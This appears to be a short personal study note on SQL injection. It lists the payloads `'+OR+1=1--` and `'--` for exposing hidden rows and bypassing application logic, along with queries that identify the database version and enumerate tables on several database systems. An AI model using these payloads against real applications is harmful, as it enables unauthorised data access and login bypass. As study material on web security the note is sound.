# Retrieving hidden data

simple attack -> `'+OR+1=1--`  [[WEB/vulnerabilities/SQL Injection/attack/payload#Retrieving hidden data#simple attack|example]]
## Examining the database

- database type and version [[WEB/vulnerabilities/SQL Injection/attack/payload#Examining the database|examples]]
	- _Microsoft, MySQL_ -> `SELECT @@version`
	- _PostgreSQL_ -> `SELECT version()`
	- _Oracle_ -> `SELECT * FROM v$version`
## Listing the contents 

- _Oracle_ [[WEB/vulnerabilities/SQL Injection/attack/payload#Listing the contents|examples]]
  - `all_tables`
  - `all_tab_columns`
- _all other databases_ -> `information_schema` 
  - `information_schema.tables`
  - `information_schema.columns`
# Subverting application logic

simple attack -> `'--` [[WEB/vulnerabilities/SQL Injection/attack/payload#Subverting application logic#simple attack|example]]
/gitcomm